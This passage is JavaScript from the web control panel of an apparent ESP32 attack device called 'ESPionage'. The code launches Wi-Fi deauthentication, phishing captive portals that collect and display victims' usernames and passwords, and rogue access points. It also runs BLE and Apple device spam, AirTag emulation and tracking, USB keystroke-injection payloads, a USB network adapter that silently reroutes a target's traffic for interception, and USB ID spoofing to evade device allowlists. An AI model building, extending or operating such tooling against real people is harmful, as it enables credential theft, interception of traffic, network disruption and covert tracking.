    b: "Pre-built payloads for common tasks. Each loads into the payload editor so you can review and modify before running. Syntax is a simplified Ducky Script: plain text lines are typed, KEY combos use WIN/CTRL/ALT/SHIFT prefix.",
    note: "All payloads target Windows unless noted. Use only on machines you own or have explicit permission to test."
  },
  usbrndis: {
    t: "USB Network (RNDIS/CDC-NCM)",
    b: "The ESP32 appears as a USB Ethernet adapter. Windows/Linux auto-installs the driver. Once up, the target PC routes traffic through the device — enabling DNS spoofing, MITM, and credential sniffing even on machines with no WiFi.",
    how: ["Plug in","OS installs RNDIS driver automatically","Device becomes default gateway","All unencrypted traffic passes through ESPionage"],
    note: "Requires ESP32-S2/S3. Works without any action from the target user."
  },
  usbstorage: {
    t: "USB Mass Storage",
    b: "Appears as a USB flash drive. Useful for dropping files onto a target, or combining with HID to run something from the 'drive'.",
    note: "Requires ESP32-S2/S3. Storage is the ESP32's internal flash (limited to a few hundred KB)."
  },
  usbspoof: {
    t: "Device ID spoof (VID/PID)",
    b: "Sets the USB Vendor ID and Product ID so the device appears as a specific product — a YubiKey, a trusted keyboard, a specific phone model. Useful for bypassing device-allowlist policies.",
    note: "Requires ESP32-S2/S3. The OS may still detect the mismatch if it probes device-specific descriptors."
  },
  gps: {
    t: "Phone GPS",
    b: "Uses your phone's GPS (via browser geolocation) to show live coordinates. Tap Enable and approve the permission prompt. Coordinates are also posted to the device so wardrive entries can be tagged with location.",
    note: "Nothing is stored on Anthropic / external servers. Works best outdoors or by a window. Accuracy in Apple/Google Maps coordinate scale."
  },
  radio: {
    t: "Radio controls",
    b: "TX power: 2\u201320 dBm. Lower = shorter range (harder to detect, less interference), higher = more range. MAC Randomize: gives the AP interface a new MAC address so you're harder to fingerprint."
  },
};

// -------- Tabs --------
document.querySelectorAll('nav button').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('nav button').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    btn.classList.add('active');
    document.getElementById(btn.dataset.tab).classList.add('active');
    if (btn.dataset.tab === 'wifi') { refreshWifi(); populateFinderTargets(); }
    if (btn.dataset.tab === 'ble')  { refreshBle();  populateBleFinderTargets(); }
    if (btn.dataset.tab === 'home') refreshActivity();
    if (btn.dataset.tab === 'portal') refreshCreds();
    if (btn.dataset.tab === 'system') loadInfo();
    if (btn.dataset.tab === 'usb') checkUsb();
  });
});

// -------- Info modal --------
function showInfo(key) {
  const d = INFO[key] || { t: key, b: 'No info yet.' };
  document.getElementById('info-title').textContent = d.t;
  let html = '<p>' + esc(d.b) + '</p>';
  if (d.how) {
    html += '<h4>How it works</h4><ol>';
    d.how.forEach(s => { html += '<li>' + esc(s) + '</li>'; });
    html += '</ol>';
  }
  if (d.fields) {
    html += '<h4>Fields</h4>';
    for (const k in d.fields) html += '<div class="kv"><span>' + esc(k) + '</span><span>' + esc(d.fields[k]) + '</span></div>';
  }
  if (d.note) html += '<div class="note">' + esc(d.note) + '</div>';
  document.getElementById('info-body').innerHTML = html;
  document.getElementById('infoModal').classList.add('open');
}
function closeInfo() { document.getElementById('infoModal').classList.remove('open'); }
document.getElementById('infoModal').addEventListener('click', (e) => {
  if (e.target.id === 'infoModal') closeInfo();
});

// -------- WebSocket --------
function connect() {
  ws = new WebSocket(`ws://${location.host}/ws`);
  ws.onopen = () => document.getElementById('conn').classList.add('ok');
  ws.onclose = () => { document.getElementById('conn').classList.remove('ok'); setTimeout(connect, 2000); };
  ws.onmessage = e => onStatus(JSON.parse(e.data));
}
connect();

function onStatus(s) {
  document.getElementById('uptime').textContent = fmtTime(s.uptime);
  document.getElementById('heap').textContent = (s.heap/1024|0) + 'kb';
  document.getElementById('stat-uptime').textContent = fmtTime(s.uptime);
  document.getElementById('stat-heap').textContent = (s.heap/1024|0);
  document.getElementById('stat-clients').textContent = s.clients || 0;

  const banner = document.getElementById('modeBanner');
  banner.textContent = modeNames[s.mode] || ('Mode ' + s.mode);
  banner.className = 'mode-banner' + (s.mode !== 0 ? ' active' : '');
  clearSceneIfIdle(s.mode);

  if (s.mode === 1) {
    document.getElementById('wifi-status').textContent = `Scanning\u2026 ${s.count||0} APs`;
    // Live-populate the list as new APs come in
    if (document.getElementById('wifi').classList.contains('active')) refreshWifi(true);
  }
  if (s.mode === 2) {
    document.getElementById('ble-status').textContent = `Scanning\u2026 ${s.count||0} devices`;
    if (document.getElementById('ble').classList.contains('active')) refreshBle(true);
  }
  if (s.mode >= 4 && s.mode <= 7 || s.mode === 14) {
    document.getElementById('spam-status').textContent = `Active \u00b7 ${s.sent||0} pkts sent`;
  }
  if (s.mode === 3) document.getElementById('spam-status').textContent = `Beacon \u00b7 ${s.sent||0} \u00b7 ${s.ssidCount} SSIDs ch${s.channel}`;
  if (s.mode === 8) {
    document.getElementById('probe-status').textContent = `Sniffing \u00b7 ${s.count||0} cached \u00b7 ${s.total||0} total`;
    if (document.getElementById('wifi').classList.contains('active')) refreshProbes(true);
  }
  if (s.mode === 9) document.getElementById('portal-status').textContent = `Active \u00b7 ${s.template||'?'} \u00b7 captured ${s.captured||0}`;
  if (s.mode === 10) document.getElementById('wardrive-status').textContent = `Wardriving \u00b7 ${s.count||0} unique`;
  if (s.mode === 11) document.getElementById('airtag-status').textContent = `Scanning \u00b7 ${s.unique||0} unique \u00b7 ${s.followers||0} followers`;
  if (s.mode === 17) document.getElementById('deauth-status').textContent = `Deauth \u00b7 ${s.sent||0} frames \u00b7 ${s.target}`;
  if (s.mode === 19) document.getElementById('airtag-emu-status').textContent = `\uD83D\uDFE5 Broadcasting as \u201c${s.name||'AirTag'}\u201d \u00b7 ${s.count||0} packets sent`;

  if (s.mode === 12) updateFinderUI('fd', s);
  if (s.mode === 13) updateFinderUI('bfd', s);
  document.getElementById('wifi-finder-panel').style.display = (s.mode === 12) ? 'block' : 'none';
  document.getElementById('ble-finder-panel').style.display = (s.mode === 13) ? 'block' : 'none';

  // GPS from Shortcut / external POST — update display whenever server has a fix
  if (s.gps && s.gps.lat) {
    const g = s.gps;
    document.getElementById('gps-panel').style.display = 'block';
    document.getElementById('gps-live-view').style.display = 'block';
    document.getElementById('gps-btn').textContent = 'Stop';
    document.getElementById('gps-lat').textContent = g.lat.toFixed(6);
    document.getElementById('gps-lon').textContent = g.lon.toFixed(6);
    document.getElementById('gps-acc').textContent = g.acc ? (g.acc|0) + ' m' : '\u2014';
    document.getElementById('gps-alt').textContent = g.alt != null ? g.alt.toFixed(1) + ' m' : '\u2014';
    document.getElementById('gps-age').textContent = g.age != null ? g.age + 's ago' : '';
    document.getElementById('gps-map').href = `https://maps.google.com/?q=${g.lat},${g.lon}`;
    document.getElementById('gps-panel').classList.add('live');
    if (!lastGps) lastGps = {};
    lastGps.lat = g.lat; lastGps.lon = g.lon;
  }
}

function updateFinderUI(prefix, s) {
  const m = (s.meters && s.meters > 0) ? s.meters.toFixed(1) : '\u2014';
  document.getElementById(prefix + '-meters').textContent = m;
  document.getElementById(prefix + '-rssi').textContent = (s.rssi && s.rssi > -127) ? s.rssi : '\u2014';
  if (prefix === 'fd' && s.channel) document.getElementById('fd-ch').textContent = s.channel;
  // Bar: map rssi -30 (full) to -100 (empty)
  const r = s.rssi || -127;
  const pct = Math.max(0, Math.min(100, ((r + 100) / 70) * 100));
  document.getElementById(prefix + '-bar').style.width = pct + '%';
  // Trend
  const te = document.getElementById(prefix + '-trend');
  const t = s.trend || 0;
  if (t > 3)      { te.textContent = '\ud83d\udd25 GETTING HOT'; te.className = 'finder-trend hot'; }
  else if (t > 1) { te.textContent = 'WARMER'; te.className = 'finder-trend warm'; }
  else if (t < -3){ te.textContent = '\u2744 COLDER'; te.className = 'finder-trend cold'; }
  else if (t < -1){ te.textContent = 'cooler'; te.className = 'finder-trend'; }
  else            { te.textContent = 'steady'; te.className = 'finder-trend'; }
}

// -------- Mode setters --------
async function setMode(m, extra = {}, btn = null) {
  // Flash the button green briefly so user knows it registered
  if (btn) {
    btn.classList.add('pressed');
    setTimeout(() => btn.classList.remove('pressed'), 600);
  }
  await fetch('/api/mode', { method: 'POST', headers: {'Content-Type':'application/json'},
    body: JSON.stringify({mode: m, ...extra}) });
  // Re-evaluate conflict banner after any mode change
  setTimeout(pollConflicts, 400);
}
// Helper: call from onclick="stop(event)" on any Stop button
function stop(e) { setMode(0, {}, e.currentTarget); }

// ── Apple Juice ─────────────────────────────────────────────────────────────
let _ajDevices = [];   // [{idx,name,cat}]
let _ajCat = 'audio';
let _ajSelected = -1;

async function ajInit() {
  try {
    const r = await fetch('/api/apple-devices');
    _ajDevices = await r.json();
    ajRender();
  } catch(e) {}
}

function ajSetCat(cat, btn) {
  _ajCat = cat;
  document.querySelectorAll('.aj-cat').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  ajRender();
}

function ajRender() {
  const grid = document.getElementById('aj-device-grid');
  if (!grid) return;
  grid.innerHTML = '';
  _ajDevices.filter(d => d.cat === _ajCat).forEach(d => {
    const b = document.createElement('button');
    b.className = 'aj-btn' + (_ajSelected === d.idx ? ' active' : '');
    b.textContent = d.name;
    b.onclick = () => ajSpam(d.idx, d.name, b);
    grid.appendChild(b);
  });
}

function ajSpam(idx, name, btn) {
  _ajSelected = idx;
  document.querySelectorAll('.aj-btn').forEach(b => b.classList.remove('active'));
  if (btn) btn.classList.add('active');
  const statusEl = document.getElementById('aj-status');
  if (statusEl) statusEl.textContent = '\uD83D\uDFE5 Spamming: ' + name;
  setMode(4, { appleIdx: idx });
}

function ajSpamRandom() {
  _ajSelected = -1;
  document.querySelectorAll('.aj-btn').forEach(b => b.classList.remove('active'));
  const statusEl = document.getElementById('aj-status');
  if (statusEl) statusEl.textContent = '\uD83C\uDFB2 Spamming: random Apple device';
  setMode(4, { appleIdx: -1 });
}

// ajInit() is called from initPage() at bottom — not directly at parse time
// ── end Apple Juice ──────────────────────────────────────────────────────────

function startBeacon() {
  const raw = document.getElementById('spam-ssids').value;
  const ssids = raw.split('\n').map(s => s.trim()).filter(Boolean);
  setMode(3, { ssids });
}

function startSsidMsg() {
  const text = document.getElementById('ssid-msg').value || 'HELLO';
  setMode(18, { text });
}

let selectedPortal = 'google';
document.querySelectorAll('.portal-pick').forEach(el => {
  el.addEventListener('click', () => {
    document.querySelectorAll('.portal-pick').forEach(p => p.classList.remove('active'));
    el.classList.add('active');
    selectedPortal = el.dataset.tmpl;
    document.getElementById('portal-selected').textContent = selectedPortal;
  });
});
function startPortal() { setMode(9, { template: selectedPortal }); }

function startRogue() {
  const ssid = document.getElementById('rogue-ssid').value || 'FreeWifi';
  setMode(16, { ssid });
}
function startAdv() {
  const name = document.getElementById('adv-name').value || 'ESPionage';
  setMode(15, { name });
}
function startAirtagEmu() {
  const name = document.getElementById('airtag-emu-name').value || 'AirTag';
  setMode(19, { name });
}
function startDeauth() {
  const sel = document.getElementById('deauth-target');
  if (!sel.value) return alert('Scan WiFi first and pick a target.');
  const [bssid, ch] = sel.value.split('|');
  setMode(17, { bssid, channel: parseInt(ch) });
}

// -------- Finders --------
function startFinder() {
  const sel = document.getElementById('finder-target');
  if (!sel.value) return alert('Scan WiFi first and pick a target.');
  const [bssid, ch] = sel.value.split('|');
  setMode(12, { bssid, channel: parseInt(ch) });
}
function startBleFinder() {
  const sel = document.getElementById('bfinder-target');
  if (!sel.value) return alert('Scan BLE first and pick a target.');
  setMode(13, { mac: sel.value });
}
async function calibrateFinder() {
  await fetch('/api/finder/calibrate', { method: 'POST' });
}
async function setFinderEnv(n) {
  await fetch('/api/finder/env', { method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({n: parseFloat(n)}) });
}

// Populate dropdowns from current scan cache
async function populateFinderTargets() {
  const r = await fetch('/api/wifi'); let data = await r.json();
  if (document.getElementById('wifi-hide-hidden')?.checked) {
    data = data.filter(a => a.ssid && a.ssid.length > 0);
  }
  data.sort((a,b) => b.rssi - a.rssi);
  const opts = data.map(a => `<option value="${a.bssid}|${a.ch}">${esc(a.ssid || '(hidden)')} (${a.rssi} dBm, ch${a.ch})</option>`).join('');
  document.getElementById('finder-target').innerHTML = '<option value="">\u2014 pick a network \u2014</option>' + opts;
  document.getElementById('deauth-target').innerHTML = '<option value="">\u2014 pick target AP \u2014</option>' + opts;
}
async function populateBleFinderTargets() {
  const r = await fetch('/api/ble'); let data = await r.json();
  if (document.getElementById('ble-hide-unnamed')?.checked) {
    data = data.filter(d => d.name && d.name.length > 0);
  }
  data.sort((a,b) => b.rssi - a.rssi);
  const opts = data.map(d => `<option value="${d.mac}">${esc(d.name||'(unnamed)')} \u00b7 ${d.mac} (${d.rssi} dBm)</option>`).join('');
  document.getElementById('bfinder-target').innerHTML = '<option value="">\u2014 pick a device \u2014</option>' + opts;
}

// -------- Scenes --------
let activeScene = null;
const SCENES = {
  demo:     { name: 'Demo',     mode: 8 },
  chill:    { name: 'Chill',    mode: 9,  params: { template: 'rickroll' } },
  recon:    { name: 'Recon',    mode: 10 },
  honeypot: { name: 'Honeypot', mode: 9,  params: { template: 'google' }, extra: { mode: 16, params: { ssid: 'Free WiFi' } } },
  panic:    { name: 'Panic',    mode: 14 },
  chaos:    { name: 'Chaos',    mode: 3,  params: { ssids: [] } },
};
async function runScene(key) {
  const s = SCENES[key]; if (!s) return;
  activeScene = key;
  // Mark UI
  document.querySelectorAll('.scene').forEach(el => el.classList.toggle('active', el.dataset.scene === key));
  document.getElementById('scene-active').style.display = 'flex';
  document.getElementById('sa-name').textContent = s.name;
  // Fire the primary mode
  await setMode(s.mode, s.params || {});
}
// Clear scene indicator when mode returns to 0
function clearSceneIfIdle(mode) {
  if (mode === 0 && activeScene) {
    activeScene = null;
    document.querySelectorAll('.scene').forEach(el => el.classList.remove('active'));
    document.getElementById('scene-active').style.display = 'none';
  }
}

// -------- GPS (uses phone's GPS via browser geolocation) --------
let gpsWatchId = null;
let lastGps = null;
function toggleGps() {
  if (gpsWatchId !== null) { stopGps(); return; }
  // Always show the helper modal first — lets user pick iPhone shortcut,
  // Android browser, or manual paste.
  document.getElementById('gpsStartModal').classList.add('open');
}
function closeGpsModal() { document.getElementById('gpsStartModal').classList.remove('open'); }
document.getElementById('gpsStartModal').addEventListener('click', (e) => {
  if (e.target.id === 'gpsStartModal') closeGpsModal();
});

function gpsStart(mode) {
  closeGpsModal();
  document.getElementById('gps-panel').style.display = 'block';
  document.getElementById('gps-error').style.display = 'none';
  document.getElementById('gps-live-view').style.display = 'block';
  if (mode === 'manual') {
    document.getElementById('gps-live-view').style.display = 'none';
    document.getElementById('gps-m-lat').focus();
    return;
  }
  // browser mode
  if (!window.isSecureContext || !navigator.geolocation) {
    document.getElementById('gps-error').style.display = 'block';
    document.getElementById('gps-live-view').style.display = 'none';
    document.getElementById('gps-btn').textContent = 'Stop';
    return;
  }
  document.getElementById('gps-btn').textContent = 'Stop';
  gpsWatchId = navigator.geolocation.watchPosition(onGps, onGpsErr, {
    enableHighAccuracy: true, timeout: 10000, maximumAge: 2000
  });
  // Phone battery (where supported)
  if (navigator.getBattery) {
    navigator.getBattery().then(b => {
      const upd = () => document.getElementById('gps-bat').textContent = Math.round(b.level*100) + '%' + (b.charging?' \u26A1':'');
      upd(); b.addEventListener('levelchange', upd); b.addEventListener('chargingchange', upd);
    });
  }
}
function stopGps() {
  if (gpsWatchId !== null) navigator.geolocation.clearWatch(gpsWatchId);
  gpsWatchId = null;
  document.getElementById('gps-btn').textContent = 'Enable';
  document.getElementById('gps-panel').classList.remove('live');
}
function onGps(pos) {
  const c = pos.coords;
  lastGps = { lat: c.latitude, lon: c.longitude, acc: c.accuracy, alt: c.altitude, spd: c.speed, hdg: c.heading, ts: Date.now() };
  document.getElementById('gps-lat').textContent = c.latitude.toFixed(6);
  document.getElementById('gps-lon').textContent = c.longitude.toFixed(6);
  document.getElementById('gps-acc').textContent = (c.accuracy|0) + ' m';
  document.getElementById('gps-alt').textContent = c.altitude != null ? c.altitude.toFixed(1) + ' m' : '\u2014';
  document.getElementById('gps-spd').textContent = c.speed != null ? (c.speed*3.6).toFixed(1) + ' km/h' : '\u2014';
  document.getElementById('gps-hdg').textContent = c.heading != null ? (c.heading|0) + '\u00B0' : '\u2014';
  document.getElementById('gps-map').href = `https://maps.google.com/?q=${c.latitude},${c.longitude}`;
  document.getElementById('gps-panel').classList.add('live');
  // Push up to device so wardrive entries can be tagged
  fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(lastGps) }).catch(()=>{});
}
function onGpsErr(e) {
  // Show the inline help panel instead of an alert
  document.getElementById('gps-error').style.display = 'block';
  document.getElementById('gps-live-view').style.display = 'none';
  document.getElementById('gps-error').innerHTML =
    '<strong>GPS error:</strong> ' + esc(e.message) +
    '<br><br>If it says "Origin does not have permission" or "secure context" you need HTTPS. ' +
    'Use Manual Fix below, or enable ' +
    '<code>chrome://flags/#unsafely-treat-insecure-origin-as-secure</code> and add <code>http://192.168.4.1</code>.';
  stopGps();
}
function submitManualGps() {
  const lat = parseFloat(document.getElementById('gps-m-lat').value);
  const lon = parseFloat(document.getElementById('gps-m-lon').value);
  if (isNaN(lat) || isNaN(lon)) { alert('Enter valid lat and lon'); return; }
  lastGps = { lat, lon, acc: 50, alt: 0, spd: 0, hdg: 0, ts: Date.now() };
  document.getElementById('gps-live-view').style.display = 'block';
  document.getElementById('gps-error').style.display = 'none';
  document.getElementById('gps-lat').textContent = lat.toFixed(6);
  document.getElementById('gps-lon').textContent = lon.toFixed(6);
  document.getElementById('gps-acc').textContent = '\u2248 50 m (manual)';
  document.getElementById('gps-map').href = `https://maps.google.com/?q=${lat},${lon}`;
  document.getElementById('gps-panel').classList.add('live');
  fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify(lastGps) }).catch(()=>{});
}
function copyGps() {
  if (!lastGps) return;
  const s = `${lastGps.lat.toFixed(6)}, ${lastGps.lon.toFixed(6)}`;
  navigator.clipboard.writeText(s).then(() => alert('Copied ' + s));
}

// -------- Refreshers --------
let wifiRefreshBusy = false, bleRefreshBusy = false;
async function refreshWifi(live = false) {
  if (wifiRefreshBusy) return; wifiRefreshBusy = true;
  try {
    const r = await fetch('/api/wifi'); let data = await r.json();
    if (document.getElementById('wifi-hide-hidden')?.checked) {
      data = data.filter(a => a.ssid && a.ssid.length > 0);
    }
    data.sort((a,b) => b.rssi - a.rssi);
    const el = document.getElementById('wifi-list');
    const scroll = el.scrollTop;
    if (!data.length) { el.innerHTML = emptyItem(live ? 'Scanning\u2026' : 'Start a scan to populate'); wifiRefreshBusy = false; return; }
    el.innerHTML = '';
    data.forEach(ap => {
      const d = document.createElement('div'); d.className = 'list-item';
      d.innerHTML = `<div class="l"><div class="name">${esc(ap.ssid || '<hidden>')}</div><div class="meta">${ap.bssid} \u00b7 ch${ap.ch} \u00b7 ${encName(ap.enc)}</div></div><div class="r ${rssiClass(ap.rssi)}">${ap.rssi} dBm</div>`;
      el.appendChild(d);
    });
    el.scrollTop = scroll;
    populateFinderTargets();
  } finally { wifiRefreshBusy = false; }
}
async function refreshBle(live = false) {
  if (bleRefreshBusy) return; bleRefreshBusy = true;
  try {
    const r = await fetch('/api/ble'); let data = await r.json();
    if (document.getElementById('ble-hide-unnamed')?.checked) {
      data = data.filter(d => d.name && d.name.length > 0);
    }
    data.sort((a,b) => b.rssi - a.rssi);
    const el = document.getElementById('ble-list');
    const scroll = el.scrollTop;
    if (!data.length) { el.innerHTML = emptyItem(live ? 'Scanning\u2026' : 'Start a scan to populate'); bleRefreshBusy = false; return; }
    el.innerHTML = '';
    data.forEach(d => {
      const div = document.createElement('div'); div.className = 'list-item';
      div.innerHTML = `<div class="l"><div class="name">${esc(d.name || '(unnamed)')}</div><div class="meta">${d.mac} \u00b7 ${esc(d.manuf || 'unknown')}</div></div><div class="r ${rssiClass(d.rssi)}">${d.rssi} dBm</div>`;
      el.appendChild(div);
    });
    el.scrollTop = scroll;
    populateBleFinderTargets();
  } finally { bleRefreshBusy = false; }
}
let probeRefreshBusy = false;
async function refreshProbes(live = false) {
  if (probeRefreshBusy) return; probeRefreshBusy = true;
  try {
    const r = await fetch('/api/probes'); const data = await r.json();
    const el = document.getElementById('probe-list');
    if (!data.length) { el.innerHTML = emptyItem(live ? 'Sniffing\u2026 no probes yet' : 'Start probe sniff to see devices'); probeRefreshBusy = false; return; }

    // Group by MAC — each device gets one card with all its probed SSIDs
    const devices = {};
    data.forEach(p => {
      if (!devices[p.mac]) devices[p.mac] = { mac: p.mac, rssi: p.rssi, ssids: new Set(), lastTs: p.ts };
      if (p.ssid) devices[p.mac].ssids.add(p.ssid);
      if (p.rssi > devices[p.mac].rssi) devices[p.mac].rssi = p.rssi; // keep strongest
      if (p.ts > devices[p.mac].lastTs) devices[p.mac].lastTs = p.ts;
    });

    const scroll = el.scrollTop;
    el.innerHTML = '';
    Object.values(devices)
      .sort((a,b) => b.rssi - a.rssi)
      .forEach(dev => {
        const ssidList = [...dev.ssids];
        const ssidTags = ssidList.length
          ? ssidList.map(s => `<span class="ssid-tag">${esc(s)}</span>`).join('')
          : '<span class="ssid-tag muted">broadcast only (no SSID)</span>';
        const d = document.createElement('div'); d.className = 'list-item probe-item';
        d.innerHTML = `
          <div class="l" style="width:100%">
            <div class="probe-header">
              <span class="name">${esc(dev.mac)}</span>
              <span class="r ${rssiClass(dev.rssi)}">${dev.rssi} dBm</span>
            </div>
            <div class="probe-networks">${ssidTags}</div>
            <div class="meta">${ssidList.length} network${ssidList.length !== 1 ? 's' : ''} remembered</div>
          </div>`;
        el.appendChild(d);
      });
    el.scrollTop = scroll;
  } finally { probeRefreshBusy = false; }
}
async function refreshCreds() {
  const r = await fetch('/api/portal/creds'); const data = await r.json();
  const el = document.getElementById('portal-creds');
  if (!data.length) { el.innerHTML = emptyItem('No credentials captured'); return; }
  el.innerHTML = '';
  data.reverse().forEach(c => {
    const d = document.createElement('div'); d.className = 'list-item';
    d.innerHTML = `<div class="l"><div class="name">${esc(c.user)}</div><div class="meta">${esc(c.pass)} \u00b7 ${esc(c.tmpl||'')}</div></div><div class="r">${fmtTime(c.ts)}</div>`;
    el.appendChild(d);
  });
}
async function refreshActivity() {
  const r = await fetch('/api/activity'); const data = await r.json();
  const el = document.getElementById('activity-list');
  if (!data.length) { el.innerHTML = emptyItem('No activity yet'); return; }
  el.innerHTML = '';
  data.forEach(e => {
    const d = document.createElement('div'); d.className = 'list-item ' + e.type;
    d.innerHTML = `<div class="l"><div class="name">${esc(e.msg)}</div><div class="meta">${e.type} \u00b7 t+${fmtTime(e.ts)}</div></div>`;
    el.appendChild(d);
  });
}

// -------- System --------
async function saveAp() {
  const apSsid = document.getElementById('ap-ssid').value.trim();
  const apPass = document.getElementById('ap-pass').value;
  if (!apSsid) return alert('SSID required');
  if (apPass && apPass.length < 8) return alert('Password must be 8+ chars or blank for open AP');
  if (!confirm('Save and reboot?')) return;
  await fetch('/api/config', { method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ apSsid, apPass }) });
}
async function saveTxp() {
  const txp = parseInt(document.getElementById('txp').value);
  await fetch('/api/config', { method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ txp }) });
}
async function randomizeMac() {
  await fetch('/api/config', { method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ randomizeMac: true }) });
  setTimeout(loadInfo, 300);
}
async function clearLogs() {
  if (!confirm('Clear all scan + capture logs?')) return;
  await fetch('/api/logs/clear', { method: 'POST' });
  refreshActivity();
}
async function reboot() {
  if (!confirm('Reboot the ESP32?')) return;
  await fetch('/api/reboot', { method: 'POST' });
}

async function loadInfo() {
  try {
    const r = await fetch('/api/info'); const d = await r.json();
    document.getElementById('info-chip').textContent = d.chip;
    document.getElementById('info-cores').textContent = d.cores;
    document.getElementById('info-freq').textContent = d.freq + ' MHz';
    document.getElementById('info-flash').textContent = (d.flash/1024/1024)+' MB';
    document.getElementById('info-mac').textContent = d.mac;
    document.getElementById('info-fw').textContent = d.firmware;
    document.getElementById('ap-ssid').value = d.apSsid || '';
    document.getElementById('txp').value = d.txp || 20;
    document.getElementById('txp-label').textContent = d.txp || 20;
  } catch(e) {}
}
// loadInfo() and refreshActivity() called from initPage() at bottom

// -------- USB --------
let usbCapable = false;
let usbHostConnected = false;
let targetOs = localStorage.getItem('targetOs') || 'auto';
let currentDuckyKey = null; // tracks which preset is loaded so OS-switch can refresh it

// Auto-detect attacker's own OS on first visit to pre-select target OS
function detectAndSetOs() {
  if (localStorage.getItem('targetOs')) {
    setTargetOs(localStorage.getItem('targetOs'), false);
    return;
  }
  const ua = navigator.userAgent;
  const os = /Mac/i.test(ua) && !/iPhone|iPad/i.test(ua) ? 'mac' : 'windows';
  setTargetOs(os, false);
}

function setTargetOs(os, save = true) {
  targetOs = os;
  if (save) localStorage.setItem('targetOs', os);
  document.getElementById('os-btn-windows').classList.toggle('active', os === 'windows');
  document.getElementById('os-btn-mac').classList.toggle('active', os === 'mac');
  // RNDIS is Windows-only — dim it on Mac
  const rndis = document.getElementById('usb-rndis-card');
  if (rndis) rndis.style.opacity = (os === 'mac' && !rndis.classList.contains('usb-locked')) ? '0.45' : '';
  // Auto-refresh the textarea if a preset script is currently loaded
  if (currentDuckyKey && DUCKY_SCRIPTS[currentDuckyKey]) {
    const entry = DUCKY_SCRIPTS[currentDuckyKey];
    document.getElementById('usb-payload').value = entry[os] || entry.windows;
  }
  // Show only presets that work on the selected OS
  applyOsFilterToPresets(os);
}

async function checkUsb() {
  try {
    const r = await fetch('/api/info'); const d = await r.json();
    usbCapable = !!d.usbCapable;
    usbHostConnected = !!d.usbHostConnected;
    const banner = document.getElementById('usb-banner');
    const title  = document.getElementById('usb-banner-title');
    const sub    = document.getElementById('usb-banner-sub');
    const icon   = document.getElementById('usb-chip-icon');
    const features = document.getElementById('usb-features');

    if (!usbCapable) {
      banner.className = 'usb-status-banner err';
      icon.textContent = '\u26D4';
      title.textContent = 'Incompatible chip: ' + (d.chip || 'ESP32');
      sub.textContent = 'USB HID requires ESP32-S3 with native USB OTG. This chip uses a USB\u2011UART bridge only.';
      features.querySelectorAll('.feature').forEach(f => f.classList.add('usb-locked'));
    } else if (!usbHostConnected) {
      banner.className = 'usb-status-banner warn';
      icon.textContent = '\uD83D\uDD0C';
      title.textContent = (d.chip || 'ESP32-S3') + ' ready \u2014 not yet connected to a target';
      sub.textContent = 'Plug the USB port into the target machine to activate HID attacks.';
      features.querySelectorAll('.feature').forEach(f => f.classList.add('usb-locked'));
    } else {
      banner.className = 'usb-status-banner ok';
      icon.textContent = '\u2705';
      title.textContent = (d.chip || 'ESP32-S3') + ' \u2014 target USB host connected';
      sub.textContent = 'Device enumerated. All USB features are live. Select your target OS above.';
      features.querySelectorAll('.feature').forEach(f => f.classList.remove('usb-locked'));
      setTargetOs(targetOs, false); // re-apply RNDIS dim state
    }
    detectAndSetOs();
  } catch(e) {}
}

// Dedicated stop for USB features (the generic stop(e) talks to /api/mode
// which doesn't touch the USB tasks).
async function usbStop() {
  try {
    await fetch('/api/usb', { method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ type: 'stop' }) });
  } catch(e) {}
  refreshUsbStatus();
}

// Toggle jiggler: if running → stop; else → start with the current interval.
async function toggleJiggler() {
  const btn = document.getElementById('usb-mouse-btn');
  if (usbJiggling) {
    await usbStop();
    if (btn) btn.innerHTML = '\u25B6 Start jiggler';
    return;
  }
  if (!usbCapable || !usbHostConnected) {
    alert('ESPionage USB port must be plugged into the target machine first.');
    return;
  }
  const interval = parseInt(document.getElementById('usb-jiggle-interval').value) || 30;
  try {
    await fetch('/api/usb', { method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ type: 'mouse', interval, os: targetOs }) });
    if (btn) btn.innerHTML = '\u23F9 Stop jiggler';
    usbJiggling = true;
  } catch(e) {}
  refreshUsbStatus();
}

let usbJiggling = false;
let usbHidActive = false;
async function refreshUsbStatus() {
  try {
    const r = await fetch('/api/usb-status');
    const d = await r.json();
    usbJiggling  = !!d.jiggling;
    usbHidActive = !!d.hidRunning;
    const mb = document.getElementById('usb-mouse-btn');
    if (mb) mb.innerHTML = usbJiggling ? '\u23F9 Stop jiggler' : '\u25B6 Start jiggler';
    // Update spoof status
    const ss = document.getElementById('usb-spoof-status');
    if (ss && d.vid) ss.textContent = `Active: ${d.product || 'HID Device'} (${d.vid}:${d.pid})`;
    // Update storage status
    const ms = document.getElementById('usb-storage-status');
    if (ms) ms.textContent = d.mscActive ? '\uD83D\uDFE2 RAM disk mounted \u2014 512 KB visible to host' : '\u25CF Not mounted';
  } catch(e) {}
}
// USB status is now updated via pollState() — no separate interval

// ── BLE HID ─────────────────────────────────────────────────────────────────
let bleHidJiggling = false;

async function bleHidPost(body) {
  try {
    await fetch('/api/ble-hid', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify(body)
    });
  } catch(e) { console.warn('bleHidPost error', e); }
}

async function bleHidBegin() {
  const name = (document.getElementById('ble-hid-name').value || 'ESPionage KB').trim();
  await bleHidPost({ type: 'advertise', name });
  refreshBleHidStatus();
}

async function bleHidStop() {
  await bleHidPost({ type: 'stop' });
  bleHidJiggling = false;
  refreshBleHidStatus();
  updateBleJigglerBtn();
}

async function bleHidRun() {
  const payload = document.getElementById('ble-hid-payload').value;
  const looping = document.getElementById('ble-hid-loop').checked;
  await bleHidPost({ type: 'hid', payload, loop: looping });
}

async function bleHidStopScript() {
  await bleHidPost({ type: 'stop' });
}

async function toggleBleJiggler() {
  if (bleHidJiggling) {
    await bleHidPost({ type: 'stop' });
    bleHidJiggling = false;
  } else {
    const interval = parseInt(document.getElementById('ble-jiggle-interval').value) || 30;
